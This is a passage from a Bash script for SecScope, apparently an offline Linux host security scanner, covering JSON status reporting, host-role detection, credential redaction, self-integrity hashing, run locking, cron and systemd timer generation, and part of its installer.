            "$(json_quote "$FILE_SCAN_MODE")" "$(json_quote "$FILE_SCAN_STATUS")" "$FILE_SCAN_BASELINE" "$FILE_SCAN_SCANNED" "$FILE_SCAN_SMALL_PRIORITY" "$FILE_SCAN_ADDED_SMALL" "$FILE_SCAN_SKIPPED" "$((FILE_SCAN_HASH_SUCCESS + FILE_SCAN_HASH_REUSED))" "$FILE_SCAN_HASH_SUCCESS" "$FILE_SCAN_HASH_REUSED" "$FILE_SCAN_HASH_FAILED" "$FILE_SCAN_CHANGES" "$FILE_SCAN_SUSPICIOUS" "$FILE_SCAN_OBSERVE" "$(json_quote "$FILE_SCAN_CONFIG_STATUS")" "$(json_quote "$FILE_SCAN_CONFIG_WARNINGS")" "$FILE_MAX_FILES" "$FILE_MAX_DEPTH" "$FILE_MAX_HASH_BYTES" "$FILE_SMALL_PRIORITY_BYTES" "$FILE_TIMEOUT_SECONDS" "$FILE_PRIORITY_ADDED_SMALL" "$FILE_PRIORITY_MODIFIED" "$FILE_PRIORITY_RUNTIME_EXE" "$FILE_PRIORITY_RUNTIME_MAPPED" "$FILE_PRIORITY_WEB_ROOT" "$FILE_PRIORITY_TMP_EXECUTABLE" "$FILE_PRIORITY_PERSISTENCE_PATH" "$FILE_PRIORITY_RECENT" "$FILE_PRIORITY_SUSPICIOUS_EXTENSION"
        printf '  "file_scan":{"status":%s,"priority_model":{"algorithm":"additive_weights","sort_order":["priority_score_desc","mtime_desc","size_asc","path_asc"],"config_status":%s,"config_warnings":%s}},\n' "$(json_quote "$FILE_SCAN_STATUS")" "$(json_quote "$FILE_SCAN_CONFIG_STATUS")" "$(json_quote "$FILE_SCAN_CONFIG_WARNINGS")"
        printf '  "yara":{"status":%s,"mode":%s,"scanner":%s,"scanner_version":%s,"rules_loaded":%s,"scanned":%s,"matched":%s,"timeout":%s,"error":%s,"promoted_findings":%s,"limits":{"max_files":%s,"file_timeout_seconds":%s,"total_timeout_seconds":%s,"max_rule_sources":%s,"rule_max_depth":%s},"raw":["raw/yara-capability.json","raw/yara-results.jsonl","raw/yara-errors.tsv","raw/yara-findings.tsv","raw/yara-summary.json"]},\n' \
            "$(json_quote "$EVENT_SOURCE_YARA")" "$(json_quote "$YARA_MODE")" "$(json_quote "${YARA_SCANNER:-none}")" "$(json_quote "$YARA_SCANNER_VERSION")" \
            "$YARA_RULES_LOADED" "$YARA_SCANNED" "$YARA_MATCHED" "$YARA_TIMEOUT_COUNT" "$YARA_ERROR_COUNT" "$YARA_PROMOTED_FINDINGS" \
            "$YARA_MAX_FILES" "$YARA_FILE_TIMEOUT" "$YARA_TOTAL_TIMEOUT" "$YARA_MAX_RULE_SOURCES" "$YARA_RULE_MAX_DEPTH"
        printf '  "web_access_log":{"WEB_ACCESS_LOG_STATUS":%s,"status":%s,"format":%s,"max_lines":%s,"source_files":%s,"sampled_lines":%s,"parsed_lines":%s,"failed_lines":%s,"raw":["raw/web-access-recent.log","raw/web-access-normalized.tsv"]},\n' "$(json_quote "$WEB_ACCESS_LOG_STATUS")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")" "$(json_quote "$WEB_ACCESS_LOG_FORMAT")" "$WEB_ACCESS_LOG_MAX_LINES" "$WEB_ACCESS_LOG_FILES" "$WEB_ACCESS_LOG_LINES" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED"
        printf '  "container_context":{"status":%s,"process_count":%s,"raw":"raw/container-context.tsv"},\n' "$(json_quote "$CONTAINER_CONTEXT_STATUS")" "$CONTAINER_CONTEXT_COUNT"
        printf '  "kubernetes_context":{"status":%s,"evidence_count":%s,"anomaly_count":%s,"raw":"raw/kubernetes-context.tsv"},\n' "$(json_quote "$KUBERNETES_CONTEXT_STATUS")" "$KUBERNETES_CONTEXT_COUNT" "$KUBERNETES_ANOMALY_COUNT"
        printf '  "telemetry_health":{"status":%s,"hunt_depth_score":%s,"source_availability_percent":%s,"explanation":%s,"sources":{"snapshot":%s,"auditd":%s,"falco":%s,"yara":%s,"ima":%s,"web_access":%s}},\n' "$(json_quote "$TELEMETRY_STATUS")" "$RUN_COVERAGE" "$SOURCE_AVAILABILITY_PERCENT" "$(json_quote "$TELEMETRY_EXPLANATION")" "$(json_quote "$EVENT_SOURCE_SNAPSHOT")" "$(json_quote "$EVENT_SOURCE_AUDITD")" "$(json_quote "$EVENT_SOURCE_FALCO")" "$(json_quote "$EVENT_SOURCE_YARA")" "$(json_quote "$EVENT_SOURCE_IMA")" "$(json_quote "$WEB_ACCESS_LOG_STATUS")"
        printf '  "process_behavior_baseline":{"status":%s,"health":%s,"observed_processes":%s,"mature_processes":%s,"learning_runs_required":3,"raw":"raw/process-behavior-baseline.tsv"},\n' "$(json_quote "$([ "$STATE_ENABLED" = true ] && printf SUCCESS || printf UNAVAILABLE)")" "$(json_quote "$PROCESS_BEHAVIOR_HEALTH")" "$PROCESS_BEHAVIOR_OBSERVED" "$PROCESS_BEHAVIOR_MATURE"
        printf '  "false_positive_suppression":{"status":"SUCCESS","count":%s,"raw":"raw/suppression-audit.tsv"},\n' "$SUPPRESSION_COUNT"
        printf '  "web_runtime_baseline":{"status":%s,"health":%s,"observed_objects":%s,"changes":%s,"raw":"raw/web-runtime-baseline.tsv"},\n' "$(json_quote "$([ "$WEB_RUNTIME_BASELINE_HEALTH" = NOT_APPLICABLE ] && printf NOT_APPLICABLE || printf SUCCESS)")" "$(json_quote "$WEB_RUNTIME_BASELINE_HEALTH")" "$WEB_RUNTIME_OBSERVED" "$WEB_RUNTIME_CHANGES"
        printf '  "iis_module_baseline":{"status":"NOT_APPLICABLE","reason":"该能力仅适用于 Windows；Linux 使用 web_runtime_baseline"},\n'
        printf '  "beacon_detection":{"status":%s,"history_health":%s,"observed_connections":%s,"candidate_count":%s,"high_count":0,"history_key":"normalized executable entity + destination + port","raw":"raw/beacon-analysis.tsv"},\n' "$(json_quote "$BEACON_STATUS")" "$(json_quote "$BEACON_HISTORY_HEALTH")" "$BEACON_OBSERVED" "$BEACON_CANDIDATES"
        printf '  "connection_baseline":{"status":%s,"health":%s,"key":"exe_sha256 + exe_path + user + dst_ip + dst_port","abnormal_count":%s,"raw":"raw/abnormal-connections.tsv"},\n' "$(json_quote "$([ "$CONNECTION_BASELINE_READY" = true ] && printf SUCCESS || printf UNAVAILABLE)")" "$(json_quote "$CONNECTION_BASELINE_HEALTH")" "${#ABNORMAL_CONN_PIDS[@]}"
        printf '  "rat_detection":{"status":%s,"finding_count":0,"high_count":0,"threat_intel_status":%s,"binary_analyzer":"DISABLED","raw":[]},\n' "$(json_quote "$RAT_STATUS")" "$(json_quote "$THREAT_INTEL_STATUS")"
        printf '  "network_policy":{"mode":"PERMANENT_OFFLINE","outbound_capability":"ABSENT_BY_DESIGN","webhook":"OUTBOUND_DISABLED_BY_DESIGN","dns_reputation_queries":false,"http_reputation_queries":false},\n'
        printf '  "webshell_detection":{"status":"STATIC_ONLY","child_process_chains":0,"static_candidates":%s,"raw":["raw/web-static-analysis.tsv"]},\n' "$(awk 'NR>1{n++}END{print n+0}' "${RAW_DIR}/web-static-analysis.tsv" 2>/dev/null || echo 0)"
        printf '  "attack_timeline":[],\n'
        printf '  "attack_chains":{"status":"DISABLED","count":0,"items":[]},\n'
        printf '  "antivirus_products":['; for idx in "${!ENDPOINT_NAMES[@]}"; do [ "$idx" -gt 0 ] && printf ','; printf '{"name":%s,"status":%s,"source":%s,"details":%s}' "$(json_quote "${ENDPOINT_NAMES[$idx]}")" "$(json_quote "${ENDPOINT_STATUSES[$idx]}")" "$(json_quote "${ENDPOINT_SOURCES[$idx]}")" "$(json_quote "${ENDPOINT_DETAILS[$idx]}")"; done; printf '],\n'
        printf '  "lifecycle":{"NEW":%s,"ONGOING":%s,"CHANGED":%s,"ESCALATED":%s,"DEESCALATED":%s,"REOPENED":%s,"RESOLVED":%s,"BASELINE_EXISTING":%s},\n' "$LIFECYCLE_NEW" "$LIFECYCLE_ONGOING" "$LIFECYCLE_CHANGED" "$LIFECYCLE_ESCALATED" "$LIFECYCLE_DEESCALATED" "$LIFECYCLE_REOPENED" "$LIFECYCLE_RESOLVED" "$LIFECYCLE_BASELINE"
        printf '  "component_inventory":['
        for idx in "${!COMPONENT_NAMES[@]}"; do [ "$idx" -gt 0 ] && printf ','; printf '{"name":%s,"version":%s,"source":%s,"support_status":%s}' "$(json_quote "${COMPONENT_NAMES[$idx]}")" "$(json_quote "${COMPONENT_VERSIONS[$idx]}")" "$(json_quote "${COMPONENT_SOURCES[$idx]}")" "$(json_quote "${COMPONENT_SUPPORT[$idx]}")"; done
        printf '],\n'
        printf '  "suspicious_files":['
        for idx in "${!FILE_BEHAVIOR_PATHS[@]}"; do
            [ "$idx" -gt 0 ] && printf ','
            file_context="${FILE_BEHAVIOR_CONTEXTS[$idx]}"
            printf '{"path":%s,"action":%s,"priority":%s,"priority_score":%s,"priority_reasons":%s,"size_bytes":%s,"severity":%s,"confidence":%s,"md5":%s,"sha256":%s,"process_context":%s,"network_context":%s,"reason":%s,"context":%s}' \
                "$(json_quote "${FILE_BEHAVIOR_PATHS[$idx]}")" "$(json_quote "${FILE_BEHAVIOR_ACTIONS[$idx]}")" "$(json_quote "${FILE_BEHAVIOR_PRIORITIES[$idx]}")" "${FILE_BEHAVIOR_PRIORITY_SCORES[$idx]:-0}" "$(csv_json_array "${FILE_BEHAVIOR_PRIORITY_REASONS[$idx]}")" "${FILE_BEHAVIOR_SIZES[$idx]:-0}" "$(json_quote "${FILE_BEHAVIOR_SEVS[$idx]}")" "$(json_quote "${FILE_BEHAVIOR_CONFIDENCES[$idx]}")" "$(json_quote "${FILE_BEHAVIOR_MD5[$idx]}")" "$(json_quote "${FILE_BEHAVIOR_SHA256[$idx]}")" \
                "$(json_quote "$(context_field "$file_context" process)")" "$(json_quote "$(context_field "$file_context" network)")" "$(json_quote "${FILE_BEHAVIOR_REASONS[$idx]}")" "$(json_quote "$file_context")"
        done
        printf '],\n'
        printf '  "abnormal_connections":['
        for idx in "${!ABNORMAL_CONN_PIDS[@]}"; do
            [ "$idx" -gt 0 ] && printf ','
            printf '{"severity":%s,"pid":%s,"process_instance_id":%s,"exe":%s,"user":%s,"cmdline":%s,"ppid":%s,"systemd_service":%s,"target":%s,"is_new":%s,"package_owner":%s,"raw_evidence":%s}' \
                "$(json_quote "${ABNORMAL_CONN_SEVS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_PIDS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_INSTANCES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_EXES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_USERS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_CMDS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_PPIDS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_SERVICES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_TARGETS[$idx]}")" "$(json_quote "${ABNORMAL_CONN_NEW[$idx]}")" "$(json_quote "${ABNORMAL_CONN_PACKAGES[$idx]}")" "$(json_quote "${ABNORMAL_CONN_RAW[$idx]}")"
        done
        printf '],\n'
        echo '  "modules": ['
        for idx in "${!MODULE_IDS[@]}"; do
            [ "$idx" -gt 0 ] && printf ',\n'
            printf '    {"id":%s,"status":%s,"duration_seconds":%s,"errors":[%s],"error":%s,"planned_sources":%s,"successful_sources":%s,"no_result_sources":%s,"unavailable_sources":%s,"failed_sources":%s,"missing_sources":%s,"coverage_percent":%s}' \
                "$(json_quote "${MODULE_IDS[$idx]}")" "$(json_quote "${MODULE_STATUSES[$idx]}")" \
                "${MODULE_DURATIONS[$idx]}" "$([ -n "${MODULE_ERRORS[$idx]}" ] && json_quote "${MODULE_ERRORS[$idx]}" || true)" "$(json_quote "${MODULE_ERRORS[$idx]}")" \
                "$(csv_json_array "${MODULE_PLANNED_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_SUCCESSFUL_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_NO_RESULT_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_UNAVAILABLE_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_FAILED_SOURCES[$idx]}")" "$(csv_json_array "${MODULE_MISSING_SOURCES[$idx]}")" "${MODULE_COVERAGES[$idx]:-0}"
        done
        [ "${#MODULE_IDS[@]}" -gt 0 ] && echo
        echo '  ]'
        echo '}'
    } > "$STATUS_FILE" || return 1
    chmod 600 "$STATUS_FILE" || return 1
    if [ "$STATE_ENABLED" = true ]; then
        LAST_STATUS_PENDING="${STATE_DIR}/.last-status.pending.${RUN_ID}"
        cp "$STATUS_FILE" "$LAST_STATUS_PENDING" || return 1
        chmod 600 "$LAST_STATUS_PENDING" || return 1
    fi
}

detect_host_role() {
    if [ "$HOST_ROLE" != "auto" ]; then
        case "$HOST_ROLE" in
            workstation|member-server|domain-controller|web-server|database-server|file-server|rdp-server|kubernetes|bastion|dev|generic) return ;;
            web) HOST_ROLE=web-server ;; database) HOST_ROLE=database-server ;;
            kubernetes-control-plane|kubernetes-node|container-host) HOST_ROLE=kubernetes ;;
            generic-server) HOST_ROLE=generic ;;
            *) HOST_ROLE=generic; add_priority_recommendation host-role '服务器角色' '配置值无效，已回退 generic' '使用公共角色名称或平台别名' ;;
        esac
        return
    fi
    if ps -eo comm=,args= 2>/dev/null | grep -qE '(^|[[:space:]])kube-apiserver([[:space:]]|$)' || \
        [ -f /etc/kubernetes/manifests/kube-apiserver.yaml ] || \
        grep -qE 'kubepods|[.]slice/kube' /proc/1/cgroup /proc/self/cgroup 2>/dev/null; then
        HOST_ROLE="kubernetes"
    elif command -v systemctl >/dev/null 2>&1 && systemctl is-active --quiet kubelet 2>/dev/null; then
        HOST_ROLE="kubernetes"
    elif command -v systemctl >/dev/null 2>&1 && systemctl is-active --quiet docker 2>/dev/null; then
        HOST_ROLE="kubernetes"
    elif socket_snapshot listen_tcp | awk '$5 ~ /:(3306|5432|27017|6379)$/ {found=1} END {exit !found}'; then
        HOST_ROLE="database-server"
    elif socket_snapshot listen_tcp | awk '$5 ~ /:(80|443|8080|8443)$/ {found=1} END {exit !found}'; then
        HOST_ROLE="web-server"
    elif ps -eo comm= 2>/dev/null | grep -qE '^(jenkins|gitlab-runner|buildkite-agent|gitea|drone)$'; then
        HOST_ROLE="dev"
    elif socket_snapshot listen_tcp | grep -qE ':(22|2222)[[:space:]].*sshd' && who 2>/dev/null | grep -q .; then
        HOST_ROLE="bastion"
    else
        HOST_ROLE="generic"
    fi
}

redact_text() {
    if [ "$INCLUDE_SENSITIVE" = true ]; then
        printf '%s' "$1"
    else
        if command -v perl >/dev/null 2>&1; then
            printf '%s' "$1" | perl -pe '
                s/((?<![A-Za-z0-9_])(?:password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)[[:space:]]*[=:][[:space:]]*)(?:"[^"]*"|'"'"'[^'"'"']*'"'"'|[^[:space:];]+)/${1}[REDACTED]/ig;
                s/((?:--(?:password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)|-[Uu])(?:=|[[:space:]]+))(?:"[^"]*"|'"'"'[^'"'"']*'"'"'|[^[:space:];]+)/${1}[REDACTED]/ig;
                s/((?:Bearer|Basic)[[:space:]]+)[A-Za-z0-9._~+\/-]+=*/${1}[REDACTED]/ig;
                s#(https?://)[^/@\s]+@#${1}[REDACTED]\@#ig'
        else
            printf '%s' "$1" | sed -E \
                -e 's/((^|[^[:alnum:]_])(password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)[[:space:]]*[=:][[:space:]]*)[^[:space:];]+/\1[REDACTED]/Ig' \
                -e 's/((--(password|passwd|token|secret|api[_-]?key|authorization|cookie|credential)|-[Uu])(=|[[:space:]]+))[^[:space:];]+/\1[REDACTED]/Ig' \
                -e 's/((Bearer|Basic)[[:space:]]+)[A-Za-z0-9._~+\/-]+/\1[REDACTED]/Ig' \
                -e 's#(https?://)[^/@[:space:]]+@#\1[REDACTED]@#Ig'
        fi
    fi
}

verify_self_integrity() {
    local script_path program_root checksum_file expected relative_path actual target issues="" seen_main=false seen_profile=false seen_yara=false
    script_path=$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd -P)/$(basename "${BASH_SOURCE[0]}")
    program_root=$(dirname "$script_path")
    checksum_file="${script_path}.sha256"
    [ -r "$checksum_file" ] || return 0
    while read -r expected relative_path _; do
        [ -n "$expected$relative_path" ] || continue
        case "$relative_path" in
            secscope.sh) seen_main=true ;;
            modules/profile.sh) seen_profile=true ;;
            modules/yara.sh) seen_yara=true ;;
            *) issues="${issues}${issues:+; }unexpected_manifest_path=${relative_path}"; continue ;;
        esac
        target="${program_root}/${relative_path}"
        if [ ! -f "$target" ] || [ -L "$target" ]; then
            issues="${issues}${issues:+; }missing_or_symlink=${relative_path}"
            continue
        fi
        actual=$(sha256_file "$target" 2>/dev/null || true)
        [ -n "$expected" ] && [ "$expected" = "$actual" ] || issues="${issues}${issues:+; }hash_mismatch=${relative_path}"
    done < "$checksum_file"
    [ "$seen_main" = true ] || issues="${issues}${issues:+; }missing_manifest_entry=secscope.sh"
    [ "$seen_profile" = true ] || issues="${issues}${issues:+; }missing_manifest_entry=modules/profile.sh"
    [ "$seen_yara" = true ] || issues="${issues}${issues:+; }missing_manifest_entry=modules/yara.sh"
    if [ -n "$issues" ]; then
        emit_find "CRITICAL" "SecScope 程序完整性异常" "$issues" "立即核查主脚本、模块和安装来源"
        record_find "CRITICAL" "integrity" "SecScope 程序完整性异常" "$issues" "核查并重新安装可信版本" "T1565" "INT-SELF-001" "$script_path" 'secscope.sh.sha256,secscope.sh,modules/profile.sh,modules/yara.sh' 'SECURITY_THREAT' HIGH '主程序或必需模块与发布校验清单不一致' '从可信发布包重新安装并复核文件权限' 'FILE,INTEGRITY'
    fi
}

acquire_run_lock() {
    local active_profile active_rank current_rank
    mkdir -p "$(dirname "$LOCK_FILE")" 2>/dev/null || return 1
    if command -v flock >/dev/null 2>&1; then
        exec 9>"$LOCK_FILE"
        if ! flock -n 9; then
            active_profile=$(sed -n 's/^profile=//p' "${LOCK_FILE}.profile" 2>/dev/null | head -1); active_profile=${active_profile:-full}
            active_rank=$(profile_rank "$active_profile"); current_rank=$(profile_rank "$SCAN_PROFILE")
            if [ "$current_rank" -gt "$active_rank" ]; then
                log_info "${active_profile} 正在运行，${SCAN_PROFILE} 按优先级等待最多 ${PROFILE_LOCK_WAIT_SECONDS}s"
                flock -w "$PROFILE_LOCK_WAIT_SECONDS" 9 || { log_warn "高优先级扫描等待锁超时，跳过本轮"; return 2; }
            else
                log_warn "${active_profile} 正在运行，${SCAN_PROFILE} 按并发策略跳过本轮"
                return 2
            fi
        fi
        LOCK_METHOD="flock"
        printf 'profile=%s\npid=%s\nstarted=%s\n' "$SCAN_PROFILE" "$$" "$RUN_STARTED_AT" > "${LOCK_FILE}.profile"
        chmod 600 "${LOCK_FILE}.profile"
    else
        if ! mkdir "${LOCK_FILE}.d" 2>/dev/null; then
            local owner_pid=""
            [ ! -L "${LOCK_FILE}.d" ] && owner_pid=$(cat "${LOCK_FILE}.d/pid" 2>/dev/null)
            if [[ "$owner_pid" =~ ^[0-9]+$ ]] && kill -0 "$owner_pid" 2>/dev/null; then
                log_warn "上一轮检查仍在运行，本轮跳过: PID ${owner_pid}"
                return 2
            fi
            rm -f -- "${LOCK_FILE}.d/pid" 2>/dev/null
            rmdir "${LOCK_FILE}.d" 2>/dev/null || {
                log_warn "锁目录异常且无法安全恢复: ${LOCK_FILE}.d"
                return 2
            }
            mkdir "${LOCK_FILE}.d" 2>/dev/null || return 2
        fi
        printf '%s\n' "$$" > "${LOCK_FILE}.d/pid"
        printf 'profile=%s\npid=%s\nstarted=%s\n' "$SCAN_PROFILE" "$$" "$RUN_STARTED_AT" > "${LOCK_FILE}.d/profile"
        chmod 700 "${LOCK_FILE}.d"
        chmod 600 "${LOCK_FILE}.d/pid"
        LOCK_METHOD="mkdir"
    fi
    return 0
}

write_timer_unit() {
    local file="$1" mode="$2" schedule_time="$3"
    if [ "$mode" = "daily" ]; then
        valid_schedule_time "$schedule_time" || return 2
        cat > "$file" <<UNIT
[Unit]
Description=Run SecScope daily at ${schedule_time}

[Timer]
OnCalendar=*-*-* ${schedule_time}:00
Persistent=true
Unit=systemd/secscope.service

[Install]
WantedBy=timers.target
UNIT
    else
        cat > "$file" <<'UNIT'
[Unit]
Description=Run SecScope every 20 minutes

[Timer]
OnBootSec=3min
OnUnitActiveSec=20min
Persistent=true
Unit=systemd/secscope.service

[Install]
WantedBy=timers.target
UNIT
    fi
}

write_profile_timer_unit() {
    local file="$1" profile="$2" interval="$3" first_run="${4:-none}" activation
    valid_schedule_interval "$interval" || return 2
    if [ "$first_run" = "$profile" ]; then activation='OnBootSec=3min'; else activation="OnActiveSec=${interval}"; fi
    cat > "$file" <<UNIT
[Unit]
Description=SecScope ${profile} layered hunt (${interval})

[Timer]
${activation}
OnUnitActiveSec=${interval}
Persistent=true
Unit=secscope@${profile}.service

[Install]
WantedBy=timers.target
UNIT
}

cron_token_value() {
    local token field="$2" value
    token=$(printf '%s' "$1" | tr '[:lower:]' '[:upper:]')
    if [[ "$token" =~ ^[0-9]{1,3}$ ]]; then
        value=$((10#$token))
    else
        case "$field:$token" in
            month:JAN) value=1 ;; month:FEB) value=2 ;; month:MAR) value=3 ;;
            month:APR) value=4 ;; month:MAY) value=5 ;; month:JUN) value=6 ;;
            month:JUL) value=7 ;; month:AUG) value=8 ;; month:SEP) value=9 ;;
            month:OCT) value=10 ;; month:NOV) value=11 ;; month:DEC) value=12 ;;
            dow:SUN) value=0 ;; dow:MON) value=1 ;; dow:TUE) value=2 ;;
            dow:WED) value=3 ;; dow:THU) value=4 ;; dow:FRI) value=5 ;;
            dow:SAT) value=6 ;;
            *) return 1 ;;
        esac
    fi
    CRON_TOKEN_VALUE="$value"
}

valid_cron_base() {
    local base="$1" field="$2" min="$3" max="$4" left right
    if [ "$base" = "*" ]; then
        return 0
    fi
    if [[ "$base" =~ ^([^-,]+)-([^-,]+)$ ]]; then
        left="${BASH_REMATCH[1]}"; right="${BASH_REMATCH[2]}"
        cron_token_value "$left" "$field" || return 1
        [ "$CRON_TOKEN_VALUE" -ge "$min" ] && [ "$CRON_TOKEN_VALUE" -le "$max" ] || return 1
        left="$CRON_TOKEN_VALUE"
        cron_token_value "$right" "$field" || return 1
        [ "$CRON_TOKEN_VALUE" -ge "$min" ] && [ "$CRON_TOKEN_VALUE" -le "$max" ] || return 1
        [ "$left" -le "$CRON_TOKEN_VALUE" ] || return 1
        return 0
    fi
    cron_token_value "$base" "$field" || return 1
    [ "$CRON_TOKEN_VALUE" -ge "$min" ] && [ "$CRON_TOKEN_VALUE" -le "$max" ]
}

valid_cron_field() {
    local value="$1" field="$2" min="$3" max="$4" part base step
    local -a parts=()
    [ -n "$value" ] || return 1
    [[ "$value" != *[[:space:]]* ]] || return 1
    [[ "$value" =~ ^[A-Za-z0-9*/,-]+$ ]] || return 1
    IFS=',' read -r -a parts <<< "$value"
    [ "${#parts[@]}" -gt 0 ] || return 1
    for part in "${parts[@]}"; do
        [ -n "$part" ] || return 1
        if [[ "$part" == */* ]]; then
            [[ "$part" =~ ^(.+)/([0-9]{1,3})$ ]] || return 1
            base="${BASH_REMATCH[1]}"; step="${BASH_REMATCH[2]}"
            [ "$step" -gt 0 ] || return 1
        else
            base="$part"
        fi
        valid_cron_base "$base" "$field" "$min" "$max" || return 1
    done
}

normalize_cron_expression() {
    local expression="$1"
    local -a fields=()
    [[ "$expression" != *$'\n'* && "$expression" != *$'\r'* ]] || return 1
    read -r -a fields <<< "$expression"
    [ "${#fields[@]}" -eq 5 ] || return 1
    valid_cron_field "${fields[0]}" minute 0 59 || return 1
    valid_cron_field "${fields[1]}" hour 0 23 || return 1
    valid_cron_field "${fields[2]}" dom 1 31 || return 1
    valid_cron_field "${fields[3]}" month 1 12 || return 1
    valid_cron_field "${fields[4]}" dow 0 7 || return 1
    NORMALIZED_CRON="${fields[0]} ${fields[1]} ${fields[2]} ${fields[3]} ${fields[4]}"
}

valid_cron_expression() {
    normalize_cron_expression "$1"
}

write_cron_file() {
    local file="$1" schedule_cron="$2" systemctl_path
    normalize_cron_expression "$schedule_cron" || return 2
    systemctl_path=$(command -v systemctl 2>/dev/null || printf '%s' '/usr/bin/systemctl')
    cat > "$file" <<CRON
# SecScope Linux cron schedule: ${NORMALIZED_CRON}
SHELL=/bin/bash
PATH=/usr/sbin:/usr/bin:/sbin:/bin
${NORMALIZED_CRON} root ${systemctl_path} start --no-block systemd/secscope.service >/dev/null 2>&1
CRON
    chmod 0644 "$file"
}

install_secscope() {
    [ "$(id -u)" -eq 0 ] || { log_error "安装需要 root 权限"; return 1; }
    command -v systemctl >/dev/null 2>&1 || { log_error "系统不支持 systemd"; return 1; }
    local source_path target="/opt/secscope/secscope.sh" config_file="/etc/secscope/secscope.conf" module module_source module_target runtime_dir yr_sha
    local schedule_mode schedule_time schedule_cron cron_file="/etc/cron.d/secscope"
    source_path=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)/$(basename "${BASH_SOURCE[0]}")
    install -d -m 0700 /opt/secscope /opt/secscope/modules /opt/secscope/helpers /opt/secscope/helpers/java \
        /opt/secscope/rules /opt/secscope/rules/yara-forge-core-20260809 \
        /opt/secscope/native/secscope-scanner /opt/secscope/native/secscope-cache /etc/secscope /var/lib/secscope
    case "$(uname -m)" in
        x86_64|amd64) runtime_dir=linux-amd64; yr_sha=dd5e5c07a0397ad922b597b8d6c35c22485ec9fe4bf26f064d242245042cdca2 ;;
        aarch64|arm64) runtime_dir=linux-arm64; yr_sha=b86c03c2868c05d760662974351e9701d1ef8edfa47644f4c68e3e341cba1759 ;;
        *) log_error "不支持的 CPU 架构: $(uname -m)"; return 1 ;;
    esac
    install -d -m 0700 "/opt/secscope/runtime/${runtime_dir}/bin"
    if [ "$source_path" != "$target" ]; then
        install -m 0500 "$source_path" "$target" || { log_error "无法安装主程序: $target"; return 1; }
    else
        chmod 0500 "$target" || return 1
    fi
    for module in profile.sh yara.sh; do
        module_source="${PROGRAM_DIR}/modules/${module}"; module_target="/opt/secscope/modules/${module}"
        [ -f "$module_source" ] && [ ! -L "$module_source" ] || { log_error "必需模块不可用: ${module_source}"; return 1; }
        if [ "$module_source" != "$module_target" ]; then
            install -m 0500 "$module_source" "$module_target" || { log_error "无法安装必需模块: ${module}"; return 1; }
        else
            chmod 0500 "$module_target" || return 1
        fi
    done
    {
        printf '%s  secscope.sh\n' "$(sha256_file "$target")"
        for module in profile.sh yara.sh; do printf '%s  modules/%s\n' "$(sha256_file "/opt/secscope/modules/${module}")" "$module"; done
    } > "${target}.sha256"
    chmod 0400 "${target}.sha256"
    local helper
    for helper in yara_normalizer.py yara_promoter.py rat_engine.py threat_intel.py corpus_manifest.py route_static_candidates.py; do
        if [ -f "${PROGRAM_DIR}/helpers/${helper}" ] && [ ! -L "${PROGRAM_DIR}/helpers/${helper}" ]; then
            install -m 0500 "${PROGRAM_DIR}/helpers/${helper}" "/opt/secscope/helpers/${helper}" || {
                log_error "无法安装只读解析 helper: ${helper}"; return 1;
            }
        fi
    done
    for helper in SecScopeRuntimeInspector.java README.md; do
        if [ -f "${PROGRAM_DIR}/helpers/java/${helper}" ] && [ ! -L "${PROGRAM_DIR}/helpers/java/${helper}" ]; then
            install -m 0400 "${PROGRAM_DIR}/helpers/java/${helper}" "/opt/secscope/helpers/java/${helper}" || {
                log_error "无法安装显式启用的 Java 深度检查源码: ${helper}"; return 1;
            }
        fi
    done
    for helper in ioc-local.txt ioc-allow.txt; do
        if [ -f "${PROGRAM_DIR}/rules/${helper}" ] && [ ! -L "${PROGRAM_DIR}/rules/${helper}" ]; then
            install -m 0400 "${PROGRAM_DIR}/rules/${helper}" "/opt/secscope/rules/${helper}" || {
                log_error "无法安装本地 IOC 规则: ${helper}"; return 1;
            }
        fi
    done
    if [ -f "${PROGRAM_DIR}/rules/yara-forge-core-20260809/yara-rules-core.yar" ] && \
       [ ! -L "${PROGRAM_DIR}/rules/yara-forge-core-20260809/yara-rules-core.yar" ]; then
        install -m 0400 "${PROGRAM_DIR}/rules/yara-forge-core-20260809/yara-rules-core.yar" \
            /opt/secscope/rules/yara-forge-core-20260809/yara-rules-core.yar || {
            log_error '无法安装内置 YARA Forge Core 规则'; return 1;
        }
    else
        log_error '内置 YARA Forge Core 规则缺失'; return 1
    fi
    if [ -x "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr" ] && [ ! -L "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr" ]; then
        [ "$(sha256_file "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr")" = "$yr_sha" ] || {
            log_error '内置 YARA-X 执行器哈希校验失败'; return 1;
        }
        install -m 0500 "${PROGRAM_DIR}/runtime/${runtime_dir}/bin/yr" "/opt/secscope/runtime/${runtime_dir}/bin/yr" || return 1
    else
        log_error "内置 ${runtime_dir} YARA-X 执行器缺失"; return 1
    fi
    if [ -x "${PROGRAM_DIR}/native/secscope-scanner/scanner" ]; then
        install -m 0500 "${PROGRAM_DIR}/native/secscope-scanner/scanner" /opt/secscope/native/secscope-scanner/scanner || return 1
    else
        log_warn 'native scanner binary 未随发布包提供，安装后将使用 Bash fallback'
    fi
    if [ -x "${PROGRAM_DIR}/native/secscope-cache/cache-daemon" ] && [ -x "${PROGRAM_DIR}/native/secscope-cache/cache-client" ]; then
        install -m 0500 "${PROGRAM_DIR}/native/secscope-cache/cache-daemon" /opt/secscope/native/secscope-cache/cache-daemon || return 1
